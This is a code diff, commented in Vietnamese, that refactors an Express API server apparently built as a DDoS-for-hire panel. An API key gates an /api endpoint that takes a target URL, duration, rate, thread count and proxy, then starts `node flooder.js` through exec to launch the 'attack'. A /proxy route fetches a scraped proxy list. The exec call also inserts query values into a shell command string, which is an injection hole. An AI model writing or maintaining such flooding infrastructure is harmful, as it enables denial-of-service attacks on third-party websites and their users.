@@ -12,50 +12,44 @@ const api_key = "quangdev"; // Khóa API của bạn
 const app = express();
 app.use(express.json());
 
+// Hàm kiểm tra URL
+const isValidUrl = (url) => urlRegex.test(url) && !blackList.some(char => url.includes(char));
+
+// Hàm kiểm tra số và giới hạn
+const isValidNumber = (value, max = Infinity) => !isNaN(value) && value >= 0 && value <= max;
+
 app.get(`/api`, async (req, res) => {
-    const field = {
-        url: req.query.url || undefined,
-        time: req.query.time || undefined,
-        rate: req.query.rate || undefined,
-        thea: req.query.thea || undefined,
-        proxy: req.query.proxy || undefined,
-        api_key: req.query.api_key || undefined,
-    };
+    const { url, time, rate, thea, proxy, api_key: apiKey } = req.query;
 
     // Kiểm tra API key
-    if (field.api_key !== api_key) return res.json({ status: 500, data: `Khóa API không hợp lệ` });
+    if (apiKey !== api_key) {
+        return res.json({ status: 500, data: `Khóa API không hợp lệ` });
+    }
 
-    // Kiểm tra các trường đầu vào
-    const containsBlacklisted = blackList.some(char => field.url.includes(char));
-    if (!field.url || !urlRegex.test(field.url) || containsBlacklisted) return res.json({ status: 500, data: `URL không hợp lệ` });
-    if (!field.time || isNaN(field.time) || field.time > 86400) return res.json({ status: 500, data: `Thời gian cần phải là một số trong khoảng 0-86400` });
-    if (!field.rate || isNaN(field.rate)) return res.json({ status: 500, data: `Rate không hợp lệ` });
-    if (!field.thea || isNaN(field.thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
-    if (!field.proxy) return res.json({ status: 500, data: `Proxy không được để trống` });
+    // Kiểm tra các tham số
+    if (!url || !isValidUrl(url)) return res.json({ status: 500, data: `URL không hợp lệ` });
+    if (!isValidNumber(time, 86400)) return res.json({ status: 500, data: `Thời gian cần phải là một số trong khoảng 0-86400` });
+    if (!isValidNumber(rate)) return res.json({ status: 500, data: `Rate không hợp lệ` });
+    if (!isValidNumber(thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
+    if (!proxy) return res.json({ status: 500, data: `Proxy không được để trống` });
 
     // Ghi log URL, thời gian, rate và threading
-    console.log(`Url: ${field.url} Time: ${field.time} Rate: ${field.rate} Threading: ${field.thea} đang thực hiện Start Attack`);
+    console.log(`Url: ${url} Time: ${time} Rate: ${rate} Threading: ${thea} đang thực hiện Start Attack`);
 
     // Chuẩn bị lệnh gọi tệp flooder.js
-    const command = `node flooder.js ${field.url} ${field.time} ${field.rate} ${field.thea} ${field.proxy}`;
+    const command = `node flooder.js ${url} ${time} ${rate} ${thea} ${proxy}`;
 
     // Gửi phản hồi trạng thái ban đầu ngay lập tức
     res.json({
         status: 200,
         message: 'Start Attack Success!',
-        data: {
-            url: field.url,
-            time: field.time,
-            rate: field.rate,
-            thea: field.thea,
-            proxy: field.proxy,
-        }
+        data: { url, time, rate, thea, proxy }
     });
 
     // Thực thi lệnh sau khi gửi phản hồi
     exec(command, (error, stdout, stderr) => {
         if (error) {
-            console.error(`Lỗi: ${stderr}`);
+            console.error(`Lỗi khi thực thi lệnh: ${stderr}`);
             return;
         }
 
@@ -63,7 +57,7 @@ app.get(`/api`, async (req, res) => {
     });
 });
 
-// Thêm route tải proxy tự động
+// Route tải proxy tự động
 app.get('/proxy', async (req, res) => {
     const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
     try {
